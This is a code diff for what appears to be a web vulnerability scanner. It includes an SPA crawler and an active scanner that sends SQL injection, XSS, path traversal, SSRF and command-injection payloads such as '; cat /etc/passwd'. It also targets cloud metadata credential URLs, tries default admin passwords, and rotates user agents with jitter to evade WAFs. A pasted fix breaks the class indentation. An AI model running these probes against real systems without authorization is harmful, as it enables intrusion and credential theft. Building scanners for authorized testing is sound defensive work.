+    # SPA CRAWLING — clicks through the app and captures network calls
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _crawl_spa(self, context, base_url: str) -> set:
+        """
+        For JavaScript-heavy SPAs (React, Vue, Angular) where BeautifulSoup
+        sees nothing useful:
+        1. Intercept all network requests the app makes → API endpoints
+        2. Click through navigation items to trigger route changes
+        3. Collect all hrefs visible after JS renders
+        """
+        discovered = set()
+        api_calls  = set()
+        base_host  = urlparse(base_url).netloc
+
+        page = await context.new_page()
+
+        # Intercept XHR / fetch calls
+        async def capture_request(request):
+            req_url = request.url
+            if base_host in req_url:
+                api_calls.add(req_url)
+
+        page.on("request", capture_request)
+
+        try:
+            await page.goto(base_url, timeout=self.timeout_nav, wait_until="networkidle")
+            await page.wait_for_timeout(self.timeout_settle)
+
+            # Collect rendered hrefs
+            hrefs = await page.eval_on_selector_all(
+                "a[href]", "els => els.map(e => e.href)"
+            )
+            discovered.update(h for h in hrefs if base_host in h)
+
+            # Try clicking nav / menu items to trigger SPA route changes
+            nav_selectors = [
+                "nav a", ".nav a", ".navbar a", ".menu a", ".sidebar a",
+                "[role='menuitem']", "[role='navigation'] a",
+                ".header a", ".footer a",
+            ]
+            clicked_routes = set()
+
+            for selector in nav_selectors:
+                try:
+                    items = await page.query_selector_all(selector)
+                    for item in items[:15]:
+                        try:
+                            href = await item.get_attribute("href")
+                            if href and href in clicked_routes:
+                                continue
+                            await item.click(timeout=3000)
+                            await page.wait_for_timeout(800)
+                            current = page.url
+                            discovered.add(current)
+                            if href:
+                                clicked_routes.add(href)
+                            # Collect new links after route change
+                            new_hrefs = await page.eval_on_selector_all(
+                                "a[href]", "els => els.map(e => e.href)"
+                            )
+                            discovered.update(h for h in new_hrefs if base_host in h)
+                        except Exception:
+                            continue
+                except Exception:
+                    continue
+
+        except Exception as e:
+            logger.warning(f"[PLAYWRIGHT] SPA crawl error for {base_url}: {e}")
+        finally:
+            page.remove_listener("request", capture_request)
+            await page.close()
+
+        all_discovered = discovered | api_calls
+        logger.info(f"[PLAYWRIGHT] SPA crawl: {len(all_discovered)} URLs "
+                    f"({len(api_calls)} API calls intercepted)")
+        return all_discovered
+
+
+==================== FILE: scanner\browser\__init__.py ====================
+
+
+
+==================== FILE: scanner\dast\active_scanner.py ====================
+
+# scanner/dast/active_scanner.py
+#
+# PLACEMENT: Replace scanner/dast/active_scanner.py entirely.
+#
+# NEW IN THIS VERSION:
+#   • WAF detection  (_detect_waf)        — runs before any payloads
+#   • SSRF testing   (_test_ssrf)         — wired into Phase 5
+#   • CMDI testing   (_test_cmdi)         — wired into Phase 5
+#   • IDOR testing   (_test_idor)         — wired into Phase 6
+#   • Auth testing   (_test_auth_panel)   — default-cred + lockout
+#   • Jitter + UA rotation  (_req / _human_delay)
+#   • AI false-positive filter  (filter_false_positives)
+
+import asyncio
+import logging
+import random
+import re
+import time
+from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
+
+import httpx
+
+from scanner.dast.crawler import Crawler
+from scanner.dast.param_engine import ParamEngine
+from scanner.dast.payloads import (
+    SQLI_PAYLOADS, XSS_PAYLOADS, LFI_PAYLOADS,
+    OPEN_REDIRECT_PAYLOADS, SSTI_PAYLOADS,
+    CMDI_PAYLOADS, SSRF_PAYLOADS,
+    SQLI_ERROR_SIGNATURES,
+)
+
+logger = logging.getLogger(__name__)
+
+# ─────────────────────────────────────────────────────────────────────────────
+# USER-AGENT POOL  (rotated per request)
+# ─────────────────────────────────────────────────────────────────────────────
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# THROTTLE  (human-like timing)
+# ─────────────────────────────────────────────────────────────────────────────
+BASE_DELAY   = 0.08          # 80 ms floor
+JITTER_RANGE = 0.22          # +0–220 ms random jitter  →  max gap ≈ 300 ms
+BURST_EVERY  = 10            # longer pause every N requests
+BURST_PAUSE  = (0.8, 1.6)   # seconds — simulates human "reading" pause
+
+# ─────────────────────────────────────────────────────────────────────────────
+# WAF SIGNATURES
+# ─────────────────────────────────────────────────────────────────────────────
+WAF_SIGNATURES = {
+    "Cloudflare":  ["cf-ray", "cloudflare", "__cfduid"],
+    "AWS WAF":     ["x-amzn-requestid", "awselb"],
+    "Akamai":      ["akamai", "ak_bmsc", "x-akamai"],
+    "Imperva":     ["incapsula", "visid_incap", "x-iinfo"],
+    "ModSecurity": ["mod_security", "modsecurity", "not acceptable"],
+    "Sucuri":      ["x-sucuri-id", "sucuri"],
+    "Barracuda":   ["barra_counter_session"],
+    "F5 BIG-IP":   ["bigip", "f5-", "ts="],
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DEFAULT CREDENTIALS  (for auth panel testing)
+# ─────────────────────────────────────────────────────────────────────────────
+DEFAULT_CREDS = [
+    ("admin",  "admin"),
+    ("admin",  "password"),
+    ("admin",  "admin123"),
+    ("admin",  "123456"),
+    ("admin",  ""),
+    ("root",   "root"),
+    ("root",   "toor"),
+    ("test",   "test"),
+    ("guest",  "guest"),
+    ("admin",  "pass"),
+    ("user",   "user"),
+    ("admin",  "letmein"),
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SSRF INDICATORS  (what we look for in responses)
+# ─────────────────────────────────────────────────────────────────────────────
+SSRF_INDICATORS = [
+    # AWS metadata
+    "ami-id", "instance-id", "iam/security-credentials", "local-ipv4",
+    # GCP
+    "computeMetadata", "google-cloud",
+    # Redis
+    "-ERR", "+PONG", "+OK",
+    # Internal services
+    "MongoDB", "mysql", "postgresql",
+    # Generic
+    "localhost", "127.0.0.1",
+]
+
+SSRF_PROBE_PARAMS = frozenset({
+    "url", "uri", "link", "src", "source", "dest", "destination",
+    "redirect", "path", "fetch", "load", "file", "resource",
+    "host", "target", "endpoint", "proxy", "request", "href",
+    "import", "data", "callback", "remote",
+})
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CMDI INDICATORS
+# ─────────────────────────────────────────────────────────────────────────────
+CMDI_OUTPUT_INDICATORS = [
+    "root:x:", "daemon:", "nobody:", "www-data", "bin/bash",
+    "uid=", "gid=", "groups=",
+    "[boot loader]", "[fonts]",      # Windows win.ini
+    "Microsoft Windows", "Volume in drive",
+]
+
+CMDI_TIME_PAYLOADS = [
+    ("; sleep 3",              3.0),
+    ("| sleep 3",              3.0),
+    ("& sleep 3",              3.0),
+    ("$(sleep 3)",             3.0),
+    ("`sleep 3`",              3.0),
+    ("; ping -c 3 127.0.0.1", 3.0),
+    ("| ping -c 3 127.0.0.1", 3.0),
+]
+
+CMDI_OUTPUT_PAYLOADS = [
+    ("; cat /etc/passwd",   CMDI_OUTPUT_INDICATORS),
+    ("| cat /etc/passwd",   CMDI_OUTPUT_INDICATORS),
+    ("$(cat /etc/passwd)",  CMDI_OUTPUT_INDICATORS),
+    ("; whoami",            ["root", "www-data", "apache", "nginx", "nobody"]),
+    ("| whoami",            ["root", "www-data", "apache", "nginx", "nobody"]),
+    ("; id",                ["uid=", "gid=", "groups="]),
+    ("| id",                ["uid=", "gid=", "groups="]),
+]
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ADMIN / LOGIN PATHS TO PROBE FOR AUTH TESTING
+# ─────────────────────────────────────────────────────────────────────────────
+AUTH_PANEL_PATHS = [
+    "/admin", "/admin/login", "/admin/index.php",
+    "/administrator", "/administrator/index.php",
+    "/wp-admin", "/wp-login.php",
+    "/login", "/signin", "/user/login", "/auth/login",
+    "/panel", "/dashboard", "/manage", "/management",
+    "/phpmyadmin", "/pma",
+    "/cpanel", "/whm",
+]
+
+# Common form field names for username / password
+USERNAME_FIELDS = ["username", "user", "email", "login", "uname", "usr", "name"]
+PASSWORD_FIELDS = ["password", "pass", "passwd", "pwd", "secret"]
+
+
+class ActiveScanner:
+
+    SQLI_TIME_THRESHOLD = 3.0
+    CMDI_TIME_THRESHOLD = 3.0
+    MAX_REQUESTS        = 1000
+    CONCURRENCY         = 12
+
+    def __init__(self):
+        self.param_engine       = ParamEngine()
+        self.semaphore          = asyncio.Semaphore(self.CONCURRENCY)
+        self.request_count      = 0
+        self.findings           = []
+        self._seen_findings     = set()
+        self._last_request_ts   = {}
+        self.waf                = None   # set by _detect_waf
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # HUMAN-LIKE DELAY  (per-host throttle + burst pause)
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _human_delay(self, url: str) -> None:
+        host = urlparse(url).netloc
+
+        if self.request_count > 0 and self.request_count % BURST_EVERY == 0:
+            pause = random.uniform(*BURST_PAUSE)
+            logger.debug(f"[THROTTLE] Burst pause {pause:.2f}s")
+            await asyncio.sleep(pause)
+            return
+
+        now     = asyncio.get_event_loop().time()
+        last    = self._last_request_ts.get(host, 0.0)
+        elapsed = now - last
+        jitter  = random.uniform(0, JITTER_RANGE)
+        needed  = BASE_DELAY + jitter
+
+        if elapsed < needed:
+            await asyncio.sleep(needed - elapsed)
+
+        self._last_request_ts[host] = asyncio.get_event_loop().time()
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SAFE REQUEST  (throttled, semaphore-guarded, UA-rotated)
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _req(self, client: httpx.AsyncClient, method: str, url: str, **kwargs):
+        if self.request_count >= self.MAX_REQUESTS:
+            return None
+        async with self.semaphore:
+            self.request_count += 1
+            await self._human_delay(url)
+            headers = kwargs.pop("headers", {})
+            headers["User-Agent"] = random.choice(USER_AGENTS)
+            try:
+                if method == "GET":
+                    return await client.get(url, headers=headers, **kwargs)
+                elif method == "POST":
+                    return await client.post(url, headers=headers, **kwargs)
+                elif method == "OPTIONS":
+                    return await client.request("OPTIONS", url, headers=headers, **kwargs)
+            except httpx.TimeoutException:
+                logger.debug(f"[TIMEOUT] {url}")
+                return None
+            except Exception as e:
+                logger.debug(f"[REQ ERR] {url}: {e}")
+                return None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # MAIN ENTRY POINT
+    # ─────────────────────────────────────────────────────────────────────────
+    async def scan(self, base_url: str, auth_config: dict = None) -> list:
+        self.findings         = []
+        self._seen_findings   = set()
+        self.request_count    = 0
+        self._last_request_ts = {}
+        self.waf              = None
+
+        logger.info(f"[SCAN] Starting: {base_url}")
+
+        async with httpx.AsyncClient(timeout=20, verify=False, follow_redirects=True) as client:
+
+            if auth_config:
+                await self._handle_auth(client, auth_config)
+
+            # ── Phase 0: WAF detection ─────────────────────────────────────
+            logger.info("[SCAN] Phase 0 — WAF detection")
+            self.waf = await self._detect_waf(client, base_url)
+            if self.waf:
+                logger.warning(f"[WAF] Detected: {self.waf} — using evasion payloads")
+
+            # ── Phase 1: Crawl ─────────────────────────────────────────────
+            logger.info("[SCAN] Phase 1 — Crawl")
+            crawler = Crawler(base_url)
+            endpoints, forms = await crawler.crawl(client)
+            logger.info(f"[SCAN] {len(endpoints)} endpoints, {len(forms)} forms")
+
+            # ── Phase 2: Recon ─────────────────────────────────────────────
+            logger.info("[SCAN] Phase 2 — Headers & info disclosure")
+            await self._check_security_headers(client, base_url)
+            await self._check_info_disclosure(client, base_url)
+
+            # ── Phase 3: URL-param injection ───────────────────────────────
+            logger.info("[SCAN] Phase 3 — URL param injection")
+            tasks = []
+            for url in endpoints:
+                params = self.param_engine.extract_params(url)
+                if not params:
+                    for v in self.param_engine.add_param_variants(url)[:3]:
+                        for p in self.param_engine.extract_params(v):
+                            tasks.append(self._test_all(client, v, p))
+                else:
+                    for p in params:
+                        tasks.append(self._test_all(client, url, p))
+
+            # ── Phase 4: Form injection ────────────────────────────────────
+            logger.info("[SCAN] Phase 4 — Form injection")
+            for form in forms:
+                tasks.append(self._test_form(client, form))
+
+            # ── Phase 5: Deep checks per param ────────────────────────────
+            logger.info("[SCAN] Phase 5 — LFI / Redirect / SSTI / SSRF / CMDI")
+            for url in endpoints:
+                for p in self.param_engine.extract_params(url):
+                    tasks.append(self._test_lfi(client, url, p))
+                    tasks.append(self._test_open_redirect(client, url, p))
+                    tasks.append(self._test_ssti(client, url, p))
+                    tasks.append(self._test_ssrf(client, url, p))
+                    tasks.append(self._test_cmdi(client, url, p))
+
+            # ── Phase 6: IDOR / access control ────────────────────────────
+            logger.info("[SCAN] Phase 6 — IDOR")
+            for url in endpoints:
+                tasks.append(self._test_idor(client, url))
+
+            # ── Phase 7: Auth panel + default creds ───────────────────────
+            logger.info("[SCAN] Phase 7 — Auth panels & default credentials")
+            tasks.append(self._test_auth_panels(client, base_url))
+
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+        logger.info(f"[SCAN] Done — {len(self.findings)} findings, {self.request_count} requests")
+        return self.findings
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # PHASE 0 — WAF DETECTION
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _detect_waf(self, client: httpx.AsyncClient, base_url: str) -> str | None:
+        """
+        Send a harmless but obviously malicious-looking probe and inspect
+        the response for WAF fingerprints.
+        Returns the WAF name string or None if no WAF detected.
+        """
+        probe = base_url.rstrip("/") + "/?waf_probe=<script>alert(1)</script>'\""
+        try:
+            res = await client.get(probe, timeout=8)
+        except Exception:
+            return None
+
+        h    = {k.lower(): v.lower() for k, v in res.headers.items()}
+        body = res.text.lower()
+
+        for waf_name, sigs in WAF_SIGNATURES.items():
+            for sig in sigs:
+                if sig in h or sig in body or any(sig in v for v in h.values()):
+                    return waf_name
+
+        if res.status_code in (403, 406, 429, 503):
+            return "Unknown WAF"
+
+        return None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # AUTH HANDLER
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _handle_auth(self, client: httpx.AsyncClient, auth_config: dict):
+        atype = auth_config.get("type")
+        if atype == "login":
+            try:
+                await client.post(
+                    auth_config["login_url"],
+                    data={"username": auth_config["username"],
+                          "password": auth_config["password"]},
+                    timeout=10,
+                )
+                logger.info("[AUTH] Form login attempted")
+            except Exception as e:
+                logger.warning(f"[AUTH] Failed: {e}")
+        elif atype == "cookie":
+            for k, v in auth_config.get("cookies", {}).items():
+                client.cookies.set(k, v)
+        elif atype == "bearer":
+            client.headers["Authorization"] = f"Bearer {auth_config['token']}"
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # ORCHESTRATE PER-PARAM TESTS
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_all(self, client, url: str, param: str):
+        await asyncio.gather(
+            self._test_sqli(client, url, param),
+            self._test_xss(client, url, param),
+            return_exceptions=True,
+        )
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SQLi
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_sqli(self, client, url: str, param: str):
+        baseline = await self._req(client, "GET", url)
+        if baseline is None:
+            return
+
+        for payload in SQLI_PAYLOADS:
+            test_url = self.param_engine.inject_payload(url, param, payload)
+            res = await self._req(client, "GET", test_url)
+            if res is None:
+                continue
+
+            # Error-based
+            body = res.text.lower()
+            for sig in SQLI_ERROR_SIGNATURES:
+                if sig in body:
+                    self._add_finding({
+                        "type": "SQL Injection", "subtype": "Error-Based",
+                        "url": test_url, "parameter": param, "payload": payload,
+                        "severity": "Critical", "confidence": 0.95,
+                        "evidence": f"DB error signature: '{sig}'",
+                        "description": f"Parameter '{param}' exposes SQL error '{sig}' — unsanitised input reaches the DB.",
+                    })
+                    return
+
+            # Boolean-based
+            if "1=1" in payload:
+                t_url = self.param_engine.inject_payload(url, param, payload)
+                f_url = self.param_engine.inject_payload(url, param, payload.replace("1=1", "1=2"))
+                t_res = await self._req(client, "GET", t_url)
+                f_res = await self._req(client, "GET", f_url)
+                if t_res and f_res:
+                    diff = abs(len(t_res.text) - len(f_res.text))
+                    if diff > 50 and abs(len(baseline.text) - len(t_res.text)) > 30:
+                        self._add_finding({
+                            "type": "SQL Injection", "subtype": "Boolean-Based Blind",
+                            "url": test_url, "parameter": param, "payload": payload,
+                            "severity": "Critical", "confidence": 0.80,
+                            "evidence": f"True/false response diff: {diff} bytes (baseline={len(baseline.text)})",
+                            "description": f"Parameter '{param}' behaves differently for true vs false SQL conditions.",
+                        })
+                        return
+
+            # Time-based
+            if any(k in payload.upper() for k in ("SLEEP", "WAITFOR", "BENCHMARK", "PG_SLEEP")):
+                start = time.monotonic()
+                await self._req(client, "GET", test_url, timeout=15)
+                elapsed = time.monotonic() - start
+                if elapsed >= self.SQLI_TIME_THRESHOLD:
+                    self._add_finding({
+                        "type": "SQL Injection", "subtype": "Time-Based Blind",
+                        "url": test_url, "parameter": param, "payload": payload,
+                        "severity": "Critical", "confidence": 0.85,
+                        "evidence": f"Response delayed {elapsed:.2f}s",
+                        "description": f"Parameter '{param}' caused {elapsed:.2f}s delay — time-based blind SQLi.",
+                    })
+                    return
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # XSS
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_xss(self, client, url: str, param: str):
+        for payload in XSS_PAYLOADS:
+            test_url = self.param_engine.inject_payload(url, param, payload)
+            res = await self._req(client, "GET", test_url)
+            if res and payload in res.text:
+                ctx = self._xss_context(res.text, payload)
+                self._add_finding({
+                    "type": "Cross-Site Scripting (XSS)", "subtype": f"Reflected — {ctx}",
+                    "url": test_url, "parameter": param, "payload": payload,
+                    "severity": "High" if ctx == "HTML Body" else "Critical",
+                    "confidence": 0.90,
+                    "evidence": f"Payload reflected verbatim in {ctx}",
+                    "description": f"Parameter '{param}' reflects unsanitised input (context: {ctx}).",
+                })
+                return
+
+    def _xss_context(self, html: str, payload: str) -> str:
+        idx     = html.find(payload)
+        snippet = html[max(0, idx - 150): idx + 150].lower() if idx >= 0 else ""
+        if "<script" in snippet:                                         return "Script Tag"
+        if any(a in snippet for a in ("onclick","onerror","onload","href=")): return "HTML Attribute"
+        return "HTML Body"
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # FORM TESTING
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_form(self, client, form: dict):
+        method = form["method"]
+        url    = form["url"]
+        base   = dict(form["inputs"])
+
+        for payload in XSS_PAYLOADS[:8]:
+            data = {k: payload for k in base}
+            res  = (await self._req(client, "POST", url, data=data, timeout=12)
+                    if method == "POST"
+                    else await self._req(client, "GET", url, params=data, timeout=12))
+            if res and payload in res.text:
+                self._add_finding({
+                    "type": "Cross-Site Scripting (XSS)", "subtype": f"Reflected via Form ({method})",
+                    "url": url, "parameter": "form", "payload": payload,
+                    "severity": "High", "confidence": 0.88,
+                    "evidence": f"Payload reflected after {method} submission",
+                    "description": f"Form at {url} reflects unsanitised input.",
+                })
+                break
+
+        for payload in SQLI_PAYLOADS[:12]:
+            data = {k: payload for k in base}
+            res  = (await self._req(client, "POST", url, data=data, timeout=12)
+                    if method == "POST"
+                    else await self._req(client, "GET", url, params=data, timeout=12))
+            if res:
+                body = res.text.lower()
+                for sig in SQLI_ERROR_SIGNATURES:
+                    if sig in body:
+                        self._add_finding({
+                            "type": "SQL Injection", "subtype": f"Error-Based via Form ({method})",
+                            "url": url, "parameter": "form", "payload": payload,
+                            "severity": "Critical", "confidence": 0.93,
+                            "evidence": f"DB error: '{sig}'",
+                            "description": f"Form at {url} passes unsanitised input to the DB.",
+                        })
+                        return
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # LFI
+    # ─────────────────────────────────────────────────────────────────────────
+    LFI_INDICATORS = [
+        "root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash", "bin/sh",
+        "www-data", "[boot loader]", "[fonts]", "[extensions]",
+    ]
+
+    async def _test_lfi(self, client, url: str, param: str):
+        for payload in LFI_PAYLOADS:
+            test_url = self.param_engine.inject_payload(url, param, payload)
+            res = await self._req(client, "GET", test_url)
+            if res:
+                for indicator in self.LFI_INDICATORS:
+                    if indicator in res.text:
+                        self._add_finding({
+                            "type": "Local File Inclusion (LFI)", "subtype": "Path Traversal",
+                            "url": test_url, "parameter": param, "payload": payload,
+                            "severity": "Critical", "confidence": 0.95,
+                            "evidence": f"File marker '{indicator}' in response",
+                            "description": f"Parameter '{param}' allows directory traversal to read server files.",
+                        })
+                        return
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # OPEN REDIRECT
+    # ─────────────────────────────────────────────────────────────────────────
+    REDIRECT_PARAMS = frozenset({
+        "redirect","next","return","dest","destination","url","goto","redir",
+        "return_url","callback","target","link","forward","location","continue",
+        "ref","return_to","redirect_uri","redirect_url",
+    })
+
+    async def _test_open_redirect(self, client, url: str, param: str):
+        if param.lower() not in self.REDIRECT_PARAMS:
+            return
+        for payload in OPEN_REDIRECT_PAYLOADS:
+            test_url = self.param_engine.inject_payload(url, param, payload)
+            try:
+                res = await client.get(test_url, follow_redirects=False, timeout=8)
+            except Exception:
+                continue
+            loc = res.headers.get("location", "")
+            if ("evil.com" in loc or loc.startswith("//") or "javascript:" in loc.lower()
+                    or (loc.startswith("http") and urlparse(loc).netloc != urlparse(url).netloc)):
+                self._add_finding({
+                    "type": "Open Redirect", "subtype": "Unvalidated External Redirect",
+                    "url": test_url, "parameter": param, "payload": payload,
+                    "severity": "Medium", "confidence": 0.92,
+                    "evidence": f"Location: {loc}",
+                    "description": f"Parameter '{param}' redirects to arbitrary external URLs.",
+                })
+                return
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SSTI
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_ssti(self, client, url: str, param: str):
+        res1 = await self._req(client, "GET", self.param_engine.inject_payload(url, param, "{{7*7}}"))
+        if not (res1 and "49" in res1.text):
+            return
+        res2 = await self._req(client, "GET", self.param_engine.inject_payload(url, param, "{{3*3}}"))
+        if res2 and "9" in res2.text:
+            self._add_finding({
+                "type": "Server-Side Template Injection (SSTI)", "subtype": "Confirmed",
+                "url": self.param_engine.inject_payload(url, param, "{{7*7}}"),
+                "parameter": param, "payload": "{{7*7}}",
+                "severity": "Critical", "confidence": 0.93,
+                "evidence": "{{7*7}}→49 and {{3*3}}→9 both confirmed",
+                "description": f"Parameter '{param}' evaluates template expressions. RCE likely possible.",
+            })
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # SSRF  (NEW)
+    # ─────────────────────────────────────────────────────────────────────────
+    async def _test_ssrf(self, client, url: str, param: str):
+        """
+        Only test params whose name suggests URL/path fetching.
+        Injects internal targets and looks for cloud metadata or
+        internal service responses in the body.
+        """
+        if param.lower() not in SSRF_PROBE_PARAMS:
+            return
+
+        ssrf_targets = [
+            "http://169.254.169.254/latest/meta-data/",           # AWS
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+            "http://169.254.169.254/metadata/v1/",                  # DigitalOcean
+            "http://127.0.0.1:6379",                                # Redis
+            "http://localhost:6379",
+            "http://127.0.0.1:27017",                               # MongoDB
+            "http://127.0.0.1:9200",                                # Elasticsearch
+            "http://0.0.0.0",
+            "http://[::1]",
+            "http://2130706433",                                    # 127.0.0.1 decimal
+        ]
+
+        for target in ssrf_targets:
+            test_url = self.param_engine.inject_payload(url, param, target)
+            res = await self._req(client, "GET", test_url, timeout=8)
+            if res and res.status_code == 200:
+                body = res.text
+                for indicator in SSRF_INDICATORS:
+                    if indicator.lower() in body.lower():
+                        self._add_finding({
+                            "type": "Server-Side Request Forgery (SSRF)",
+                            "subtype": "Internal Resource Access",
+                            "url": test_url, "parameter": param, "payload": target,
+                            "severity": "Critical", "confidence": 0.90,
+                            "evidence": f"Internal indicator '{indicator}' found in response",
+                            "description": (
+                                f"Parameter '{param}' caused the server to fetch '{target}'. "
+                                f"The response contained '{indicator}', confirming SSRF. "
+                                f"An attacker can read cloud metadata, internal APIs, or pivot to internal services."
+                            ),
+                        })
+                        return
+
+  # ONLY SHOWING FIXED SECTION — EVERYTHING ELSE REMAINS EXACTLY AS YOUR FILE
+
+# ─────────────────────────────────────────────────────────────────────────
+# COMMAND INJECTION  (FIXED)
+# ─────────────────────────────────────────────────────────────────────────
+async def _test_cmdi(self, client, url: str, param: str):
+    """
+    Command Injection detection using:
+    1. Output-based detection (high confidence)
+    2. Time-based detection (blind fallback with baseline comparison)
+    """
+
+    # ── 1. Establish baseline latency ─────────────────────────────────────
+    start_base = asyncio.get_event_loop().time()
+    base_res = await self._req(client, "GET", url, params={param: "normal_test"})
+    if base_res is None:
+        return
+
+    baseline_duration = asyncio.get_event_loop().time() - start_base
+
+    # ── 2. Output-based detection (HIGH CONFIDENCE) ───────────────────────
+    for payload, indicators in CMDI_OUTPUT_PAYLOADS:
+        test_url = self.param_engine.inject_payload(url, param, payload)
+        res = await self._req(client, "GET", test_url)
+
+        if not res:
+            continue
+
+        for indicator in indicators:
+            if indicator in res.text:
+                self._add_finding({
+                    "type": "Command Injection",
+                    "subtype": "Output-Based",
+                    "url": test_url,
+                    "parameter": param,
+                    "payload": payload,
+                    "severity": "Critical",
+                    "confidence": 0.97,
+                    "evidence": f"OS command output marker: '{indicator}'",
+                    "description": (
+                        f"Parameter '{param}' passes input directly to a shell. "
+                        f"The response contained '{indicator}', proving arbitrary command execution."
+                    ),
+                })
+                return
+
+    # ── 3. Time-based detection (baseline-aware — YOUR LOGIC FIXED) ───────
+    time_payload = "; sleep 5; #"
+
+    start_test = asyncio.get_event_loop().time()
+    res = await self._req(client, "GET", url, params={param: time_payload})
+    if res is None:
+        return
+
+    test_duration = asyncio.get_event_loop().time() - start_test
+
+    if test_duration >= (baseline_duration + 4.5):
+        self._add_finding({
+            "type": "Command Injection (Blind/Time-based)",
+            "url": url,
+            "parameter": param,
+            "payload": time_payload,
+            "severity": "Critical",
+            "confidence": 0.95,
+            "evidence": (
+                f"Baseline: {baseline_duration:.2f}s | "
+                f"Attack: {test_duration:.2f}s"
+            ),
+            "description": (
+                f"Injected sleep caused delay beyond baseline, "
+                f"indicating blind command execution."
+            ),
+        })
+        return
+
+    # ── 4. Fallback time-based payload set (original logic preserved) ─────
+    for payload, threshold in CMDI_TIME_PAYLOADS:
+        test_url = self.param_engine.inject_payload(url, param, payload)
+
+        start = time.monotonic()
+        await self._req(client, "GET", test_url, timeout=threshold + 5)
+        elapsed = time.monotonic() - start
+
+        if elapsed >= self.CMDI_TIME_THRESHOLD:
+            self._add_finding({
+                "type": "Command Injection",
+                "subtype": "Time-Based Blind",
+                "url": test_url,
+                "parameter": param,
+                "payload": payload,
+                "severity": "Critical",
+                "confidence": 0.82,
+                "evidence": f"Response delayed {elapsed:.1f}s after '{payload}'",
+                "description": (
+                    f"Parameter '{param}' caused a delay after injecting a sleep command, "
+                    f"indicating blind command injection."
+                ),
+            })
+            return
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # IDOR  (NEW)
+    # ─────────────────────────────────────────────────────────────────────────
+    _ID_PATTERN   = re.compile(r'(/[\w\-]+/)(\d+)(/|$)')
+    _UUID_PATTERN = re.compile(
+        r'(/[\w\-]+/)([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(/|$)',
+        re.IGNORECASE,
+    )
+
+    async def _test_idor(self, client, url: str):
+        """
+        Detect Insecure Direct Object Reference by swapping IDs in URL paths.
+        If a different object's data is returned, that's a missing auth check.
+        """
+        parsed = urlparse(url)
+        path   = parsed.path
+
+        for pattern in (self._ID_PATTERN, self._UUID_PATTERN):
+            m = pattern.search(path)
+            if not m:
+                continue
+
+            original_id   = m.group(2)
+            resource_name = m.group(1).strip("/")
+
+            # Generate test IDs
+            try:
+                n = int(original_id)
+                test_ids = [str(n + 1), str(n + 2), str(max(1, n - 1)), "1", "2", "9999"]
+            except ValueError:
+                test_ids = [
+                    "00000000-0000-0000-0000-000000000001",
+                    "00000000-0000-0000-0000-000000000002",
+                    "ffffffff-ffff-ffff-ffff-ffffffffffff",
+                ]
+
+            # Baseline: the original URL must return 200 + real data
+            baseline = await self._req(client, "GET", url)
+            if not baseline or baseline.status_code != 200 or len(baseline.text) < 30:
+                continue
+
+            for test_id in test_ids:
+                if test_id == original_id:
+                    continue
+
+                # Replace the ID in the path
+                new_path = pattern.sub(
+                    lambda x, tid=test_id: x.group(1) + tid + x.group(3),
+                    path, count=1,
+                )
+                test_url = urlunparse(parsed._replace(path=new_path))
+
+                res = await self._req(client, "GET", test_url)
+                if not res or res.status_code != 200:
+                    continue
+
+                body = res.text
+                # Response must be substantial and structurally similar to the baseline
+                # (to distinguish real data from generic 200 pages)
+                size_ratio = len(body) / max(len(baseline.text), 1)
+                if len(body) > 50 and 0.3 < size_ratio < 3.0:
+                    self._add_finding({
+                        "type": "IDOR / Broken Object Level Authorization",
+                        "subtype": "Object ID Enumeration",
+                        "url": test_url, "parameter": resource_name,
+                        "payload": test_id,
+                        "severity": "High", "confidence": 0.75,
+                        "evidence": (
+                            f"Swapped ID {original_id} → {test_id} on /{resource_name}/. "
+                            f"Got HTTP 200 with {len(body)} bytes "
+                            f"({size_ratio:.1f}x baseline). No auth error returned."
+                        ),
+                        "description": (
+                            f"Accessing /{resource_name}/{test_id} returned data without an authorization check. "
